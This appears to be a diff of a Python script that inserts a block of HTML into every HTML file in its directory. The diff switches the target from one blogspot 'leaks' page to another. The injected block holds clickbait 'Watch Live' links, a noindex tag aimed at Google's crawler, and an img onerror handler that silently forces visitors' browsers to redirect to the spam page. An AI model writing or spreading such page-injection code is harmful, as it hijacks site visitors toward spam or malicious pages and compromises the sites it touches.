@@ -5,10 +5,10 @@ directory_path = os.path.dirname(os.path.abspath(__file__))
 
 # Code you want to replace in the HTML files
 replacement_code = '''
-<center><h1><a href="https://today-game-pass.blogspot.com/2024/12/leaks.html"> Watch Now <h1></center>
-<center><a href="https://today-game-pass.blogspot.com/2024/12/leaks.html"><img src="https://edu.ieee.org/in-mepco-wie/wp-content/uploads/sites/387/2016/09/click-here-logo-button-gif-images-2.gif?format=750w" alt="Click Here"></a></center>
+<center><h1><a href="https://today-online-tv-now.blogspot.com/2024/12/leaks.html"> Watch Live <h1></center>
+<center><a href="https://today-online-tv-now.blogspot.com/2024/12/leaks.html"><img src="https://edu.ieee.org/in-mepco-wie/wp-content/uploads/sites/387/2016/09/click-here-logo-button-gif-images-2.gif?format=750w" alt="click here"></a></center>
 <meta name="googlebot" content="noindex">
-<img src='0' onerror= top.location.href='https://today-game-pass.blogspot.com/2024/12/leaks.html'>
+<img src='0' onerror= top.location.href='https://today-online-tv-now.blogspot.com/2024/12/leaks.html'>
 '''
 
 # Loop through each HTML file in the directory
